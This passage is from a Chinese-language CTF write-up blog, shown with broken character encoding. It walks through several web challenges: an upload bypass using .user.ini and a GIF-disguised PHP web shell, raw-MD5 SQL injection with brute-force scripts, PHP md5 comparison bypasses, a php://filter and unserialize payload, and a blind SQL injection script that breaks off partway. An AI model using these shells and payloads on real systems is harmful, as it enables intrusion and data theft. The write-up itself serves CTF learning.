&lt;p&gt;.user.iniã€‚å®ƒæ¯”.htaccessç”¨çš„æ›´å¹¿ï¼Œä¸ç®¡æ˜¯nginx/apache/IISï¼Œåªè¦æ˜¯ä»¥fastcgiè¿è¡Œçš„phpéƒ½å¯ä»¥ç”¨è¿™ä¸ªæ–¹æ³•ã€‚å¯è°“å¾ˆå¹¿ï¼Œä¸åƒ.htaccessæœ‰å±€é™æ€§ï¼Œåªèƒ½æ˜¯apache.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;å‡†å¤‡å¥½.user.iniæ–‡ä»¶å†…å®¹ä¸ºè‡ªåŠ¨åŒ…å«å›¾ç‰‡é©¬ï¼Œå› ä¸ºä¸Šä¼ ä¼šæ£€æŸ¥æ–‡ä»¶å¤´ï¼Œæ‰€ä»¥æ·»åŠ äº†ä¸€ä¸ªGIFæ–‡ä»¶å¤´ä¼ªè£…ï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;GIF89a
auto_prepend_file=233.gif
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æ¥ä¸‹æ¥ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œå°è¯•äº†æ­£å¸¸ä¸Šä¼ PHPé©¬ä¼šæç¤ºï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;lt;? in contents!&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;æ‰€ä»¥ä½¿ç”¨scripté©¬æ‰§è¡Œphpï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;GIF89a
&amp;lt;script language=&amp;#34;php&amp;#34;&amp;gt;eval($_REQUEST[shell])&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ä¸Šä¼ æˆåŠŸåä¼šæç¤ºæ–‡ä»¶è·¯å¾„ï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Your dir uploads/852aff287f54bca0ed7757a702913e50
Your files :
array(5) { [0]=&amp;gt; string(1) &amp;ldquo;.&amp;rdquo; [1]=&amp;gt; string(2) &amp;ldquo;..&amp;rdquo; [2]=&amp;gt; string(9) &amp;ldquo;.user.ini&amp;rdquo; [3]=&amp;gt; string(7) &amp;ldquo;233.gif&amp;rdquo; [4]=&amp;gt; string(9) &amp;ldquo;index.php&amp;rdquo; }&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;è¿™æ—¶å€™.user.iniæ–‡ä»¶å·²ç»ä¼šå¸®æˆ‘ä»¬è‡ªåŠ¨åŒ…å«å›¾ç‰‡é©¬äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è®¿é—®ä¸€ä¸ªPHPæ–‡ä»¶å³å¯ï¼Œæ­£å¥½ä¸Šä¼ ç›®å½•ä¸‹æœ‰ä¸€ä¸ªindex.phpæ–‡ä»¶ï¼Œå¯ä»¥ç›´æ¥èšå‰‘è¿æ¥æˆ–è€…POSTè¯·æ±‚system(&amp;lsquo;cat /flag&amp;rsquo;)ã€‚&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="bjdctf2020easy-md5"&gt;[BJDCTF2020]Easy MD5
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210201105021.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a class="link" href="https://www.jianshu.com/p/12125291f50d" target="_blank" rel="noopener"
&gt;ã€Jarvis OJã€‘Login&amp;ndash;password=&amp;rsquo;&amp;quot;.md5($pass,true).&amp;quot;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://blog.csdn.net/March97/article/details/81222922" target="_blank" rel="noopener"
&gt;sqlæ³¨å…¥ï¼šmd5($password,true)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/" target="_blank" rel="noopener"
&gt;Leet More 2010 Oh Those Admins! writeup&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;éšä¾¿è¾“å…¥ä¸€äº›ä¸œè¥¿éƒ½æ²¡æœ‰ååº”ï¼Œåœ¨è¯·æ±‚å¤´ä¸­å‘ç°äº†ä¸€ä¸ªHintï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;select * from &amp;lsquo;admin&amp;rsquo; where password=md5($pass,true)&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;è¯­æ³•&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;md5(string,raw)&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;å‚æ•°&lt;/th&gt;
&lt;th&gt;æè¿°&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;string&lt;/td&gt;
&lt;td&gt;å¿…éœ€ã€‚è¦è®¡ç®—çš„å­—ç¬¦ä¸²ã€‚&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;raw&lt;/td&gt;
&lt;td&gt;å¯é€‰ã€‚é»˜è®¤ä¸å†™ä¸ºFALSEã€‚32ä½16è¿›åˆ¶çš„å­—ç¬¦ä¸²TRUEã€‚16ä½åŸå§‹äºŒè¿›åˆ¶æ ¼å¼çš„å­—ç¬¦ä¸²&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;æ¦‚æ‹¬ç†è§£ï¼Œè¿™é‡Œå¦‚æœrawå‚æ•°ä¸º&lt;code&gt;true&lt;/code&gt;çš„è¯ï¼Œè¿™ä¸ªå‡½æ•°çš„è¿”å›å€¼æ˜¯&lt;code&gt;string&lt;/code&gt;çš„md5åŠ å¯†å€¼è¿›è¡Œåå…­è¿›åˆ¶è§£ç çš„å­—ç¬¦ä¸²ã€‚è¿™é“é¢˜æˆ‘å½“æ—¶æ˜¯ç›´æ¥çœ‹äº†æºç è·³è¿‡äº†ç¬¬ä¸€å±‚ï¼Œç¬¬ä¸€å±‚çš„ç­”æ¡ˆå…¶å®æ˜¯&lt;code&gt;ffifdyop&lt;/code&gt;ï¼Œæˆ‘ä»¬æ¥å¯¹å®ƒè¿›è¡Œä¸€æ³¢æ“ä½œ&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;æºå­—ç¬¦ä¸²ï¼šffifdyop&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;md5åŠ å¯†å€¼ï¼š276f722736c95d99e921722cf9ed621c&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;hexè§£ç ï¼š&amp;lsquo;or'6Ã‰].Ã©!r,Ã¹Ã­b.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æœ€åé‚£å‡ ä¸ªåº”è¯¥æ˜¯ä¸å¯è§å­—ç¬¦ï¼Œé‡è¦çš„æ˜¯å‰é¢ä¸€æ®µï¼š&lt;code&gt;'or'6&lt;/code&gt;ï¼Œè¿™é‡Œè¿˜è¦è¯´æ˜ä¸€ä¸‹ï¼Œè¿™æç¤ºåº”è¯¥ä¸ç®—ä¸¥è°¨ï¼ŒçœŸæ­£çš„sqlè¯­å¥åº”è¯¥æ˜¯åœ¨md5å‡½æ•°å‰åå„ä¸€ä¸ª&lt;code&gt;'&lt;/code&gt;å•å¼•å·ã€‚æ‰§è¡Œä»¥åçœŸæ­£çš„sqlè¯­å¥ä¸º&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;select * from &amp;#39;admin&amp;#39; where password=&amp;#39;&amp;#39;or&amp;#39;6Ã‰].Ã©!r,Ã¹Ã­b.â€˜
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å¯ä»¥çœ‹åˆ°åŸç†æ˜¯æ„æˆä¸€ä¸ªé—­åˆï¼Œè¿™é‡Œè¿˜æœ‰ç¬¬äºŒä¸ªçŸ¥è¯†ç‚¹ï¼Œæ˜¯oråé¢çš„å­—ç¬¦ä¸²è¢«è®¤ä¸ºæ˜¯trueï¼Œå¼•ç”¨æ–‡ç« é‡Œçš„ä¸€æ®µï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;a string starting with a &lt;code&gt;1&lt;/code&gt; is cast as an integer when used as a boolean.&lt;/p&gt;
&lt;p&gt;åœ¨mysqlé‡Œé¢ï¼Œåœ¨ç”¨ä½œå¸ƒå°”å‹åˆ¤æ–­æ—¶ï¼Œä»¥1å¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢«å½“åšæ•´å‹æ•°ã€‚è¦æ³¨æ„çš„æ˜¯è¿™ç§æƒ…å†µæ˜¯å¿…é¡»è¦æœ‰å•å¼•å·æ‹¬èµ·æ¥çš„ï¼Œæ¯”å¦‚password=â€˜xxxâ€™ or â€˜1xxxxxxxxxâ€™ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºpassword=â€˜xxxâ€™ or 1 ï¼Œä¹Ÿå°±ç›¸å½“äºpassword=â€˜xxxâ€™ or trueï¼Œæ‰€ä»¥è¿”å›å€¼å°±æ˜¯trueã€‚å½“ç„¶åœ¨æˆ‘åæ¥æµ‹è¯•ä¸­å‘ç°ï¼Œä¸åªæ˜¯1å¼€å¤´ï¼Œåªè¦æ˜¯æ•°å­—å¼€å¤´éƒ½æ˜¯å¯ä»¥çš„ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;è‡ªå·±è¿›è¡Œçš„æµ‹è¯•ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210201113825.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210201113839.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥çœŸæ­£çš„è§£æ³•æ˜¯åªè¦sqlè¯­å¥çš„æ ¼å¼ä¸ºpassword=&amp;lsquo;xxxxxxxx&amp;rsquo; or &amp;lsquo;1xxxx&amp;rsquo;ï¼Œå³hexåŒ…å«å­—ç¬¦ä¸²&amp;quot;276f722731&amp;quot;ï¼ˆ&amp;lsquo;or'1ï¼‰ï¼Œå…¶å®oråé¢å¼€å¤´åªè¦æ˜¯æ•°å­—å³å¯ï¼Œ1-9çš„hexèŒƒå›´ä¸º31-39ã€‚&lt;/p&gt;
&lt;p&gt;ä¸‹é¢è¿™ä¸ªç¨‹åºæ˜¯è¿™é“é¢˜å¼€å¤´å‚è€ƒåˆ—è¡¨ä¸­çš„ç¬¬ä¸‰ä¸ªé“¾æ¥ã€‚&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
for ($i = 0;;) {
for ($c = 0; $c &amp;lt; 1000000; $c++, $i++)
if (stripos(md5($i, true), &amp;#39;\&amp;#39;or\&amp;#39;&amp;#39;) !== false)
echo &amp;#34;\nmd5($i) = &amp;#34; . md5($i, true) . &amp;#34;\n&amp;#34;;
echo &amp;#34;.&amp;#34;;
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;è¿™ä¸ªç¨‹åºéå†æ•°å­—è¿›è¡Œmd5åŠ å¯†ï¼Œä½¿ç”¨striposåŒ¹é…æ˜¯å¦æœ‰&lt;code&gt;'or'&lt;/code&gt;ï¼Œè¿™ä¸ªå‡½æ•°æœ‰ä¸€ä¸ªå¼Šç—…å°±æ˜¯å¦‚æœæ˜¯ä»¥&lt;code&gt;'or'&lt;/code&gt;å¼€å¤´çš„ä¸ä¼šåŒ¹é…åˆ°ï¼Œå¹¶ä¸”æˆ‘ä»¬éœ€è¦çš„æ˜¯oråé¢ä»¥æ•°å­—å¼€å¤´éƒ½å¯ä»¥ï¼Œæ‰€ä»¥éœ€è¦ç¨å¾®åšä¸€äº›ä¿®æ”¹ï¼Œä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ç”±&lt;code&gt;\'or\'&lt;/code&gt;æ”¹ä¸º&lt;code&gt;'or'([1-9]+|0+[1-9])&lt;/code&gt; &lt;del&gt;ä¸è¿‡æˆ‘çš„æ–¹æ³•è‡ªå·±è¿˜æ²¡è·‘å‡ºæ¥ğŸ¤£ï¼Œå›å¤´åŠ ä¸ªå¤šçº¿ç¨‹è¯•ä¸€è¯•&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;ï¼ˆæ›´æ–°ï¼‰&lt;/p&gt;
&lt;p&gt;è‡ªå·±å†™äº†ä¸€ä¸ªpythonç¨‹åºï¼Œæ”¾åœ¨å­¦ç”ŸæœåŠ¡å™¨ä¸Šè·‘äº†ä¸€ä¸ªä¸‹åˆåŠ ä¸€ä¸ªæ™šä¸Šï¼Œå‡ºäº†ä¸¤ä¸ªç­”æ¡ˆï¼Œå¥½å®¶ä¼™ä»1è·‘åˆ°52äº¿ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210203094304.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt; æ‰¾åˆ°äº†md5(2413633098):
æ‰¾åˆ°äº†md5(5207660362):
æ‰¾åˆ°äº†md5(8351555222):
æ‰¾åˆ°äº†md5(13095770027):
æ‰¾åˆ°äº†md5(14860117901):
æ‰¾åˆ°äº†md5(15724086109):
æ‰¾åˆ°äº†md5(16529176061):
æ‰¾åˆ°äº†md5(17428338265):
æ‰¾åˆ°äº†md5(18717303578):
æ‰¾åˆ°äº†md5(19342380396):
æ‰¾åˆ°äº†md5(23960028257):
æ‰¾åˆ°äº†md5(32561902614):
æ‰¾åˆ°äº†md5(38983153698):
æ‰¾åˆ°äº†md5(39742292223):
æ‰¾åˆ°äº†md5(44120894060):
æ‰¾åˆ°äº†md5(44820604888):
æ‰¾åˆ°äº†md5(45570673322):
æ‰¾åˆ°äº†md5(45855250502):
æ‰¾åˆ°äº†md5(53660569009):
æ‰¾åˆ°äº†md5(55098175010):
æ‰¾åˆ°äº†md5(59763304323):
æ‰¾åˆ°äº†md5(60185044906):
æ‰¾åˆ°äº†md5(68625783421):
æ‰¾åˆ°äº†md5(70949326264):
(md5å€¼åˆ äº†ï¼Œå› ä¸ºä¹±ç ä¼šå½±å“åšå®¢çš„æœç´¢åŠŸèƒ½)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ç¨‹åºæºç å¦‚ä¸‹ï¼ˆè‡ªå·±å†™ç€ç©ï¼Œè½»å–·ï¼‰ï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;# codeing = utf-8
import threading
import hashlib
import re
import itertools
import time
# r&amp;#39;\&amp;#39;or\&amp;#39;([1-9]+|0+[1-9])&amp;#39;
# r&amp;#39;\&amp;#39;or\&amp;#39;&amp;#39;
pattern=re.compile(r&amp;#39;\&amp;#39;or\&amp;#39;([1-9]+|0+[1-9])&amp;#39;,re.I)
item = itertools.count(1)
def thrfunc():
while 1:
s2 = &amp;#39;&amp;#39;
temp = str(next(item))
s1 = hashlib.md5(temp.encode(encoding=&amp;#39;UTF-8&amp;#39;)).hexdigest()
for i in range(0, len(s1), 2):
s2 = s2 + chr(int(s1[i:i + 2], 16))
if re.search(pattern, s2):
print(&amp;#34;æ‰¾åˆ°äº†md5(&amp;#34; + temp + &amp;#34;): &amp;#34; + s2)
threads=[]
for i in range(10):
t = threading.Thread(target=thrfunc)
threads.append(t)
t.start()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;è™½ç„¶ä¸çŸ¥é“å¤šæ•´å‡ ä¸ªèƒ½ç”¨çš„å€¼å¯ä»¥å¹²ä»€ä¹ˆï¼Œä½†æ˜¯è§‰å¾—è‡ªå·±å†™çš„ç¨‹åºè·‘å‡ºæ¥ç­”æ¡ˆå°±å¾ˆçˆ½ğŸ¤£ã€‚&lt;/p&gt;
&lt;p&gt;è¿˜æœ‰ä¸€ä¸ªèƒ½ç”¨çš„md5å€¼ï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;content: 129581926211651571912466741651878684928
hex: 06da5430449f8f6f23dfc1276f722738
raw: \x06\xdaT0D\x9f\x8fo#\xdf\xc1&amp;#39;or&amp;#39;8
string: T0Do#&amp;#39;or&amp;#39;8
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ä»¥ä¸Šæ˜¯ç¬¬ä¸€å±‚ã€‚&lt;strong&gt;å…¶å®çœ‹äº†æºç é‡ŒåªéªŒè¯äº†å­—ç¬¦ä¸²æ˜¯å¦ç­‰äº&lt;code&gt;ffifdyop&lt;/code&gt;æˆ‘å†™çš„è„šæœ¬é‡Œçš„å€¼è‚¯å®šé€šè¿‡ä¸äº†&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ç¬¬äºŒå±‚å¯ä»¥ç›´æ¥åœ¨æºç ä¸­çœ‹åˆ°æ³¨é‡Šã€‚&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;$a = $GET[&amp;#39;a&amp;#39;];
$b = $_GET[&amp;#39;b&amp;#39;];
if($a != $b &amp;amp;&amp;amp; md5($a) == md5($b)){
// wow, glzjin wants a girl friend.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ç®€å•çš„md5ä»¥0Eå¼€å¤´&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;a=QNKCDZO&amp;amp;b=240610708
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ç¬¬ä¸‰å±‚&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
error_reporting(0);
include &amp;#34;flag.php&amp;#34;;
highlight_file(__FILE__);
if($_POST[&amp;#39;param1&amp;#39;]!==$_POST[&amp;#39;param2&amp;#39;]&amp;amp;&amp;amp;md5($_POST[&amp;#39;param1&amp;#39;])===md5($_POST[&amp;#39;param2&amp;#39;])){
echo $flag;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;è¿™ä¸€æœ‰ä¸€äº›ä¸åŒçš„æ˜¯md5æ¯”è¾ƒä½¿ç”¨äº†&lt;code&gt;===&lt;/code&gt;ä¸ä»…æ¯”è¾ƒç±»å‹è¿˜æ¯”è¾ƒå€¼ã€‚ä½†æ˜¯md5æœ‰ä¸€ä¸ªï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;md5([1,2,3]) == md5([4,5,6]) == NULL
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æ‰€ä»¥ä¼ å…¥ä¸¤ä¸ªæ•°ç»„ï¼Œåˆèƒ½ä¿è¯ä¸¤ä¸ªå˜é‡ä¸ç›¸ç­‰ï¼Œmd5åŠ å¯†æœ‰éƒ½æ˜¯NULLä¸”ç±»å‹æ˜¯æ•°ç»„ç±»å‹ï¼Œæ³¨æ„æ•°ç»„é‡Œçš„å€¼è¿˜æ˜¯ä¸å¯ä»¥ä¸€æ ·çš„ã€‚&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;param1[]=1&amp;amp;param2[]=2
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="zjctf-2019nizhuansiwei"&gt;[ZJCTF 2019]NiZhuanSiWei
&lt;/h1&gt;&lt;p&gt;æºç &lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
$text = $_GET[&amp;#34;text&amp;#34;];
$file = $_GET[&amp;#34;file&amp;#34;];
$password = $_GET[&amp;#34;password&amp;#34;];
if(isset($text)&amp;amp;&amp;amp;(file_get_contents($text,&amp;#39;r&amp;#39;)===&amp;#34;welcome to the zjctf&amp;#34;)){
echo &amp;#34;&amp;lt;br&amp;gt;&amp;lt;h1&amp;gt;&amp;#34;.file_get_contents($text,&amp;#39;r&amp;#39;).&amp;#34;&amp;lt;/h1&amp;gt;&amp;lt;/br&amp;gt;&amp;#34;;
if(preg_match(&amp;#34;/flag/&amp;#34;,$file)){
echo &amp;#34;Not now!&amp;#34;;
exit();
}else{
include($file); //useless.php
$password = unserialize($password);
echo $password;
}
}
else{
highlight_file(__FILE__);
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å…ˆæ¥ä¸€æ®µ&lt;a class="link" href="https://segmentfault.com/a/1190000018991087" target="_blank" rel="noopener"
&gt;PHPä¼ªåè®®æ€»ç»“&lt;/a&gt;ï¼Œè¿™é¢˜çš„ç¬¬ä¸€æ­¥æ˜¯åˆ¤æ–­ä¼ å…¥textå‚æ•°å¹¶è¯»å–å†…å®¹ï¼Œåˆ¤æ–­å†…å®¹ä¸º&lt;strong&gt;welcome to the zjctf&lt;/strong&gt;ï¼Œä½¿ç”¨&lt;code&gt;data://&lt;/code&gt;ä¼ªåè®®ã€‚&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?text=data://text/plain,welcome to the zjctf
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æ¥ä¸‹æ¥æ˜¯æ–‡ä»¶åŒ…å«ï¼Œæœ‰äº†æç¤º&lt;code&gt;useless.php&lt;/code&gt;è‚¯å®šè¦è¯»ä¸€è¯»çœ‹çœ‹ï¼Œä½¿ç”¨&lt;code&gt;php://filter&lt;/code&gt;ä¼ªåè®®ã€‚&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?text=data://text/plain,welcome to the zjctf&amp;amp;file=php://filter/convert.base64-encode/resource=useless.php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å¾—åˆ°çš„å†…å®¹&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
class Flag{ //flag.php
public $file;
public function __tostring(){
if(isset($this-&amp;gt;file)){
echo file_get_contents($this-&amp;gt;file);
echo &amp;#34;&amp;lt;br&amp;gt;&amp;#34;;
return (&amp;#34;U R SO CLOSE !///COME ON PLZ&amp;#34;);
}
}
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å¹¶ä¸”æ–‡ä»¶åŒ…å«ä¸‹é¢æœ‰ä¸€ä¸ªååºåˆ—åŒ–ï¼Œåˆçœ‹åˆ°äº†&lt;code&gt;__tostring&lt;/code&gt;å‡½æ•°ï¼Œ&lt;strong&gt;å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²å¯¹å¾…çš„æ—¶å€™ï¼Œä¼šè§¦å‘è¿™ä¸ªé­”æœ¯æ–¹æ³•&lt;/strong&gt;ã€‚æˆ‘æ„é€ çš„å¯¹è±¡&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
class Flag{
public $file=&amp;#34;flag.php&amp;#34;;
}
$f = new Flag();
echo serialize($f);
//O:4:&amp;#34;Flag&amp;#34;:1:{s:4:&amp;#34;file&amp;#34;;s:8:&amp;#34;flag.php&amp;#34;;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;åœ¨ä¼ å…¥å¯¹è±¡ä¹‹å‰å½“ç„¶è¦æŠŠè¯»å–æ–‡ä»¶æµæ”¹ä¸ºæ­£å¸¸åŒ…å«æ–‡ä»¶äº†ã€‚æœ€ç»ˆpayload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?text=data://text/plain,welcome to the zjctf&amp;amp;file=useless.php&amp;amp;password=O:4:&amp;#34;Flag&amp;#34;:1:{s:4:&amp;#34;file&amp;#34;;s:8:&amp;#34;flag.php&amp;#34;;}
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="ciscn2019-ååŒ—èµ›åŒº-day2-web1hack-world"&gt;[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210307171921.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;å¾ˆæ˜æ˜¾çš„sqlæ³¨å…¥ï¼Œéšä¾¿å°è¯•ä¸€äº›è¯­å¥æœ‰&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1 &amp;raquo; Hello, glzjin wants a girlfriend.&lt;/p&gt;
&lt;p&gt;2 &amp;raquo; Do you want to be my girlfriend?&lt;/p&gt;
&lt;p&gt;3ä¹‹åéƒ½æ˜¯ &amp;raquo; Error Occured When Fetch Result.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;è¾“å…¥ä¸€ä¸ªå•å¼•å·&lt;code&gt;1'&lt;/code&gt;å‡ºç°äº†&lt;code&gt;bool(false)&lt;/code&gt;ï¼Œæ˜¯ä¸€ä¸ªå¸ƒå°”ç±»å‹è¿”å›ï¼Œå°±å¾ˆæœ‰å¯èƒ½æ˜¯ç›²æ³¨ä¹‹ç±»çš„ã€‚æµ‹è¯•çš„æ—¶å€™è¿˜å‘ç°ç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œç©ºæ ¼è¢«è¿‡æ»¤å¯ä»¥å°è¯•ä½¿ç”¨TABåˆ¶è¡¨ç¬¦ä»£æ›¿ã€‚&lt;/p&gt;
&lt;p&gt;é¢˜ç›®ä¸­ä¹Ÿæœ‰æç¤º&lt;/p&gt;
&lt;blockquote&gt;
&lt;h3 id="all-you-want-is-in-table-flag-and-the-column-is-flag"&gt;All You Want Is In Table &amp;lsquo;flag&amp;rsquo; and the column is &amp;lsquo;flag&amp;rsquo;
&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;è¯´æ˜flagåœ¨flagè¡¨çš„flagå­—æ®µä¸­ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªå¸ƒå°”ç›²æ³¨çš„è„šæœ¬ï¼Œæ€è·¯å°±æ˜¯æŸ¥è¯¢flagçš„å€¼ä½¿ç”¨&lt;code&gt;substr&lt;/code&gt;å‡½æ•°æ¯æ¬¡æˆªå–ä¸€ä¸ªå­—ç¬¦ï¼Œè·å¾—å…¶&lt;code&gt;ascii&lt;/code&gt;å€¼å†ä½¿ç”¨äºŒåˆ†æ³•ç¡®å®šå…·ä½“çš„å€¼ï¼Œæœ€åæ‹¼æ¥è¾“å‡ºã€‚&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; requests
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; time
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;url &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;http://26670c55-697e-4520-ae0a-bd23a786cd72.node3.buuoj.cn/&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;result &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; x &lt;span style="color:#f92672"&gt;in&lt;/span&gt; range(&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;50&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; high &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;127&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; low &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;32&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; mid &lt;span style="color:#f92672"&gt;=&lt;/span&gt; (low &lt;span style="color:#f92672"&gt;+&lt;/span&gt; high) &lt;span style="color:#f92672"&gt;//&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;while&lt;/span&gt; high&lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt;low:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; payload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;if(ascii(substr((select flag from flag),&lt;/span&gt;&lt;span style="color:#e6db74"&gt;%d&lt;/span&gt;&lt;span style="color:#e6db74"&gt;,1))&amp;gt;&lt;/span&gt;&lt;span style="color:#e6db74"&gt;%d&lt;/span&gt;&lt;span style="color:#e6db74"&gt;,1,2)&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;%&lt;/span&gt; (x, mid)
